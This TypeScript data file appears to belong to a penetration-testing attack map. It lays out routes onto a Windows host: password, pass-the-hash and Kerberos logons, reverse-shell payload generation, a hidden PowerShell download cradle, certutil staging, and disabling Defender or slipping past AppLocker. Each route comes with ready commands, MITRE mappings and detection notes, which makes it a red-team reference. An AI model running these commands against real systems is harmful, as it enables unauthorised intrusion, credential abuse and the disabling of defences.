import type { AttackEdge, TechniqueNodeDef } from '../schema';
import { mitre, r } from '../lib';

/**
 * Windows foothold on-ramp — a SLIM, hand-curated front-end for the Win-PE map.
 *
 * It replaces the old auto-generated front-end (kb-win-foothold), which duplicated the AD
 * map's lateral-movement / credential lanes and carried a generated voice. The way ONTO a
 * Windows host is two short lanes that both converge on `pe-start` (Local Foothold), where
 * the curated priv-esc triage takes over:
 *   - Credentialed Logon — broken by AUTH METHOD (password/key, NTLM hash, Kerberos),
 *     because what you hold decides how you authenticate. The AD map carries the full
 *     lateral-movement detail; this is just the on-ramp.
 *   - Execution & Evasion — turn a code-execution primitive into a stable shell, and get
 *     your tooling past the host's defences (AMSI/AV, AppLocker/Constrained Language Mode).
 *
 * Voice matches the curated core: terse summaries, short `requires`, primary sources only.
 */
export const winFootholdNodes: TechniqueNodeDef[] = [
  {
    id: 'win-foothold-start',
    label: 'Get a Foothold',
    phase: 'access',
    kind: 'start',
    summary: 'Land a session on a Windows host you can reach.',
    description:
      'You can reach a Windows host and hold (or can obtain) a credential or a code-execution primitive, but no shell yet. Turn that into an interactive or command session: log on with the credential material you hold, or stabilise a code-execution primitive into a usable shell. Either route yields a Local Foothold, and the privilege-escalation triage begins.',
    references: [
      { label: 'HackTricks, Windows Local Privilege Escalation', url: 'https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html' },
    ],
  },

  // ── Lane: Credentialed Logon (by auth method) ──────────────────────────────────
  {
    id: 'win-cat-logon',
    label: 'Credentialed Logon',
    phase: 'access',
    kind: 'category',
    summary: 'Use a credential to open a session on the host.',
    description:
      'You hold credential material for an account with remote-access rights. How you authenticate depends on what you hold: a cleartext password or key, an NT hash, or a Kerberos ticket. The Active Directory map carries the full lateral-movement detail; here it is the entry to a local foothold.',
  },
  {
    id: 'win-logon-password',
    label: 'Password / Key Logon',
    phase: 'access',
    summary: 'Cleartext password or key into a WinRM, RDP, SMB, or SSH session.',
    description:
      'With a valid account password (or an SSH private key), open a session over whichever remote service the account may use: WinRM for a PowerShell shell, RDP for an interactive desktop, SMB command execution in the admin user\'s context (SYSTEM only if the smbexec/service method is used), or SSH on OpenSSH hosts. Membership in Remote Management Users, Remote Desktop Users, or local Administrators decides which services accept the logon.',
    requires: ['A valid account password or key', 'A remote-access service the account may use (WinRM/RDP/SMB/SSH)'],
    commands: [
      { label: 'WinRM PowerShell shell', code: r`evil-winrm -i <host> -u <user> -p '<pass>'`, lang: 'bash' },
      { label: 'SMB service exec (nxc)', code: r`nxc smb <host> -u <user> -p '<pass>' -x 'whoami'`, lang: 'bash' },
      { label: 'RDP session', code: r`xfreerdp /u:<user> /p:'<pass>' /v:<host> /cert:ignore`, lang: 'bash' },
      { label: 'SSH (OpenSSH on Windows)', code: r`ssh <user>@<host>`, lang: 'bash' },
    ],
    tools: [
      { name: 'evil-winrm', url: 'https://github.com/Hackplayers/evil-winrm' },
      { name: 'NetExec', url: 'https://github.com/Pennyw0rth/NetExec' },
    ],
    mitre: mitre('T1021'),
    references: [
      { label: 'MITRE ATT&CK, Remote Services (T1021)', url: 'https://attack.mitre.org/techniques/T1021/' },
      { label: 'HackTricks, Lateral Movement', url: 'https://book.hacktricks.wiki/en/windows-hardening/lateral-movement/index.html' },
    ],
    opsec: 'Each logon writes a 4624 event (logon type 3 for SMB/WinRM, 10 for RDP); evil-winrm and service execution are signatured. Prefer the protocol the account already uses.',
  },
  {
    id: 'win-logon-pth',
    label: 'Pass-the-Hash (NTLM)',
    phase: 'access',
    summary: 'NT hash into NTLM auth over SMB/PsExec or WinRM.',
    description:
      'When you hold an account\'s NT hash but not its cleartext, authenticate with the hash directly over NTLM rather than cracking it. SMB service execution (psexec/smbexec) needs local admin on the target; WinRM needs Remote Management Users. NTLM must be permitted (no Kerberos-only or Protected Users enforcement on the account).',
    requires: ['An account NT hash', 'NTLM permitted, and local admin (SMB) or Remote Management Users (WinRM) on the target'],
    commands: [
      { label: 'SMB exec with the hash', code: r`nxc smb <host> -u <user> -H <NThash> -x 'whoami'`, lang: 'bash' },
      { label: 'PsExec SYSTEM shell', code: r`impacket-psexec -hashes :<NThash> <user>@<host>`, lang: 'bash' },
      { label: 'WinRM with the hash', code: r`evil-winrm -i <host> -u <user> -H <NThash>`, lang: 'bash' },
    ],
    tools: [
      { name: 'Impacket', url: 'https://github.com/fortra/impacket' },
      { name: 'NetExec', url: 'https://github.com/Pennyw0rth/NetExec' },
      { name: 'evil-winrm', url: 'https://github.com/Hackplayers/evil-winrm' },
    ],
    mitre: mitre('T1550.002'),
    references: [
      { label: 'MITRE ATT&CK, Pass the Hash (T1550.002)', url: 'https://attack.mitre.org/techniques/T1550/002/' },
      { label: 'The Hacker Recipes, Pass the Hash', url: 'https://www.thehacker.recipes/ad/movement/ntlm/pth' },
    ],
    opsec: 'PtH triggers NTLM logons (4624 type 3) with the machine reporting NTLM where Kerberos is expected. Modern EDR flags psexec service creation (7045).',
  },
  {
    id: 'win-logon-kerberos',
    label: 'Kerberos Logon',
    phase: 'access',
    summary: 'A TGT/ccache or key into a Kerberos-authenticated WinRM/SMB session.',
    description:
      'With a Kerberos TGT (ccache) or an account\'s AES/NT key, authenticate over Kerberos instead of NTLM: overpass-the-hash mints a TGT from a key, pass-the-ticket reuses a stolen one. Open WinRM or SMB by the host\'s SPN/FQDN. The path of choice where NTLM is disabled.',
    requires: ['A Kerberos TGT (ccache) or an AES/NT key', 'Target reachable by its Kerberos FQDN/SPN; clock within 5 minutes of the KDC', '/etc/krb5.conf defining the realm (UPPERCASE) and its KDC, with KRB5CCNAME pointing at the ccache from the prior step; a missing or wrong krb5.conf is the most common silent failure'],
    commands: [
      { label: 'Request a TGT, then use it', code: r`getTGT.py <domain>/<user> -hashes :<NThash>
export KRB5CCNAME=<user>.ccache`, lang: 'bash' },
      { label: 'WinRM over Kerberos', code: r`evil-winrm -i <host.fqdn> -r <REALM>`, lang: 'bash' },
      { label: 'SMB with the ticket cache', code: r`nxc smb <host.fqdn> --use-kcache -x 'whoami'`, lang: 'bash' },
      { label: 'Fix clock skew (KRB_AP_ERR_SKEW)', code: r`sudo ntpdate -u <dc>   # or wrap the tool in faketime to avoid changing system time`, lang: 'bash' },
      { label: 'On-host TGT and inject (Rubeus)', code: r`Rubeus.exe asktgt /user:<user> /rc4:<NThash> /ptt`, lang: 'powershell' },
    ],
    tools: [
      { name: 'Impacket', url: 'https://github.com/fortra/impacket' },
      { name: 'Rubeus', url: 'https://github.com/GhostPack/Rubeus' },
    ],
    mitre: mitre('T1550.003'),
    references: [
      { label: 'MITRE ATT&CK, Pass the Ticket (T1550.003)', url: 'https://attack.mitre.org/techniques/T1550/003/' },
      { label: 'HackTricks, Pass the Ticket', url: 'https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/pass-the-ticket.html' },
      { label: 'Duckwall & Delpy, Abusing Microsoft Kerberos (Black Hat USA 2014)', url: 'https://blackhat.com/docs/us-14/materials/us-14-Duckwall-Abusing-Microsoft-Kerberos-Sorry-You-Guys-Don%27t-Get-It-wp.pdf' },
    ],
    opsec: 'Kerberos logons blend in better than NTLM, but ticket requests for an unusual host/SPN and clock-skew errors are visible to the KDC.',
  },

  // ── Lane: Code Execution (unlike the credential lane it doesn't fork, so no folder;
  //     defense evasion moved OUT to the shared gate off Local Foothold, below) ──
  {
    id: 'win-exec-foothold',
    label: 'Code Execution',
    phase: 'execution',
    summary: 'Turn a one-shot code-exec primitive into a stable interactive session.',
    description:
      'From a fragile or one-shot primitive (web RCE, command injection, a delivered payload), get a reliable shell: generate a payload, stage it onto the host, trigger a callback to your listener, then stabilise the session. The AD map covers reusing the resulting access to move on.',
    requires: ['A code-execution primitive on the target', 'An outbound path to your listener (or an inbound port you can reach)'],
    commands: [
      { label: 'Generate a payload', code: r`msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<you> LPORT=443 -f exe -o s.exe`, lang: 'bash' },
      { label: 'Catch the shell', code: r`ncat -lvnp 443     # or OpenBSD nc -lvn 443 (port positional); or msfconsole: use exploit/multi/handler`, lang: 'bash' },
      { label: 'PowerShell download cradle', code: r`powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://<you>/a.ps1')"`, lang: 'powershell' },
      { label: 'Stage tooling onto the host', code: r`certutil -urlcache -split -f http://<you>/t.exe %TEMP%\t.exe`, lang: 'cmd' },
    ],
    tools: [
      { name: 'Metasploit (msfvenom)', url: 'https://github.com/rapid7/metasploit-framework' },
      { name: 'Ncat (Nmap)', url: 'https://nmap.org/ncat/' },
    ],
    mitre: mitre('T1059'),
    references: [
      { label: 'MITRE ATT&CK, Command and Scripting Interpreter (T1059)', url: 'https://attack.mitre.org/techniques/T1059/' },
      { label: 'HackTricks, Reverse Shells (Windows)', url: 'https://book.hacktricks.wiki/en/generic-hacking/reverse-shells/windows.html' },
    ],
    opsec: 'msfvenom stock payloads and certutil downloads are heavily signatured. Match the payload arch to the target and prefer a LOLBin or in-memory cradle over dropping an EXE on monitored hosts.',
  },
  // ── Shared gate: Defense Evasion. Hangs off the Local Foothold, so it applies
  //     however you got in (credentialed logon OR code-exec) — not only to RCE. ──
  {
    id: 'win-cat-evasion',
    label: 'Defense Evasion',
    phase: 'execution',
    kind: 'category',
    summary: 'Clear host controls before running loud tooling; applies however you got in.',
    description:
      'Defense evasion is an execution constraint on everything you run after the foothold, whether you arrived by a credentialed logon or a code-execution shell, not an escalation step. winPEAS, Potato tooling, driver loads, and LSASS access all trip AMSI, Defender / EDR + Tamper Protection, or AppLocker / WDAC / CLM. On a managed host, clear the relevant control (or pick native / LOLBIN / in-memory tradecraft) before working the escalation lanes; on an unmanaged host none of these controls apply.',
  },
  {
    id: 'win-evade-amsi-av',
    label: 'AMSI / Defender Evasion',
    phase: 'execution',
    summary: 'Run flagged tooling past AMSI and Defender.',
    description:
      'Your script or payload is caught by AMSI (in-memory script scanning) or Defender (on-disk and behavioural). Running fileless only reduces on-disk artifact exposure; PowerShell/script and some dynamic content can still hit AMSI and Defender behavioural/cloud detections, so use AMSI-aware obfuscation or a same-process AMSI bypass where that is the actual blocker. Where you hold admin, add an exclusion or disable real-time protection. An AMSI patch is per-process, so it must run in the same process that executes the payload.',
    requires: ['Code execution in an AMSI-instrumented host (PowerShell/.NET), or write/exec where AV blocks the artifact', 'For disabling protection or adding exclusions: local admin / SYSTEM', 'Tamper Protection OFF: on modern default Windows (10/11 + Server) TP is on by default and SILENTLY blocks Set-MpPreference -DisableRealtimeMonitoring even for SYSTEM; the cmdlets return no error but no effect. Exclusion writes are blocked only where Defender exclusion tamper protection is actually enabled (typically Intune-only or ConfigMgr-only with the documented platform/settings requirements), so do not assume every managed host blocks local exclusions'],
    commands: [
      { label: 'Confirm AMSI is the blocker', code: r`'AmsiScanBuffer' ; 'Invoke-Mimikatz'   # a known-bad string trips AMSI if it is on`, lang: 'powershell' },
      { label: 'Check Tamper Protection before relying on Set-MpPreference', code: r`(Get-MpComputerStatus).IsTamperProtected`, lang: 'powershell' },
      { label: 'Add a Defender exclusion (admin; blocked by TP on managed hosts)', code: r`Add-MpPreference -ExclusionPath C:\Windows\Temp   # Add- appends; Set-MpPreference -ExclusionPath REPLACES the whole list`, lang: 'powershell' },
      { label: 'Disable real-time protection (admin/SYSTEM; blocked by TP on default hosts)', code: r`Set-MpPreference -DisableRealtimeMonitoring $true`, lang: 'powershell' },
    ],
    tools: [
      { name: 'amsi.fail', url: 'https://amsi.fail/' },
      { name: 'Invoke-Obfuscation', url: 'https://github.com/danielbohannon/Invoke-Obfuscation' },
    ],
    mitre: mitre('T1562.001'),
    references: [
      { label: 'MITRE ATT&CK, Impair Defenses: Disable or Modify Tools (T1562.001)', url: 'https://attack.mitre.org/techniques/T1562/001/' },
      { label: 'HackTricks, Antivirus (AV) Bypass', url: 'https://book.hacktricks.wiki/en/windows-hardening/av-bypass.html' },
    ],
    opsec: 'Successful RTP disablement/config changes commonly emit 5001/5007 (and related 5004/5010/5012 depending on what changed); Tamper Protection-blocked attempts emit 5013, and exclusion changes usually show as 5007 when they actually apply. Defender tampering is a high-signal detection. AMSI patches are loud if the patch string itself is signatured; vary it.',
  },
  {
    id: 'win-evade-appcontrol',
    label: 'AppLocker / CLM / WDAC Escape',
    phase: 'execution',
    summary: 'Escape a locked-down shell or application-control policy to run code.',
    description:
      'Execution is constrained by policy: PowerShell Constrained Language Mode (often a JEA endpoint), AppLocker, or WDAC. Run through an allowed LOLBIN (living-off-the-land binary: a trusted, signed Windows tool like MSBuild or InstallUtil, abused to run your code), fall back to the PowerShell v2 engine where it survives, or sign your payload with a recovered or forged code-signing certificate that a publisher allow-rule trusts. MSBuild and InstallUtil defeat default AppLocker and CLM but are neutered by a WDAC policy that carries the Microsoft recommended block rules; a WDAC escape generally needs a different vector (a signer/hash allow-list gap or a LOLBIN not yet on the block list).',
    requires: ['Execution inside a ConstrainedLanguage / AppLocker / WDAC context', 'An allowed LOLBIN, the PSv2 engine, or a trusted code-signing certificate'],
    commands: [
      { label: 'Check the language mode', code: r`$ExecutionContext.SessionState.LanguageMode`, lang: 'powershell' },
      { label: 'Drop to PowerShell v2 IF .NET 3.5/2.0 is present (legacy hosts / Server 2012 R2)', code: r`powershell -version 2 -ep bypass   # fails silently on default Win10/11 + Server 2016+: .NET 3.5 not installed`, lang: 'cmd' },
      { label: 'Run code via the MSBuild LOLBIN', code: r`C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe payload.csproj`, lang: 'cmd' },
    ],
    tools: [
      { name: 'LOLBAS', url: 'https://lolbas-project.github.io/' },
    ],
    mitre: mitre('T1127.001'),
    references: [
      { label: 'MITRE ATT&CK, Trusted Developer Utilities Proxy Execution: MSBuild (T1127.001)', url: 'https://attack.mitre.org/techniques/T1127/001/' },
      { label: 'LOLBAS Project', url: 'https://lolbas-project.github.io/' },
    ],
    opsec: 'Script-block logging still records what you run even in Constrained Language Mode, and signed-binary proxy execution (MSBuild/InstallUtil) is a known EDR pattern. Code-signing abuse needs a cert the target already trusts.',
  },
];

export const winFootholdEdges: AttackEdge[] = [
  // Two ways in. The credential lane forks (three replay mechanics), so it's a folder;
  // code execution doesn't fork, so it's a single node.
  { source: 'win-foothold-start', target: 'win-cat-logon', label: 'have a credential' },
  { source: 'win-foothold-start', target: 'win-exec-foothold', label: 'have code execution' },

  { source: 'win-cat-logon', target: 'win-logon-password' },
  { source: 'win-cat-logon', target: 'win-logon-pth' },
  { source: 'win-cat-logon', target: 'win-logon-kerberos' },

  // Every on-ramp technique converges on the Local Foothold, where triage begins.
  { source: 'win-logon-password', target: 'pe-start' },
  { source: 'win-logon-pth', target: 'pe-start' },
  { source: 'win-logon-kerberos', target: 'pe-start' },
  { source: 'win-exec-foothold', target: 'pe-start' },

  // Defense Evasion is a CROSS-CUTTING gate off the Local Foothold, not a lane under
  // code-exec: EDR/AMSI/AppLocker bite whether you logged in with a credential or
  // dropped a shell, and they block priv-esc tooling (winPEAS, Potato, driver loads).
  // The evasion nodes are execution CONSTRAINTS, so they're leaves — not a path to SYSTEM.
  { source: 'pe-start', target: 'win-cat-evasion', label: 'managed host?' },
  { source: 'win-cat-evasion', target: 'win-evade-amsi-av' },
  { source: 'win-cat-evasion', target: 'win-evade-appcontrol' },
];
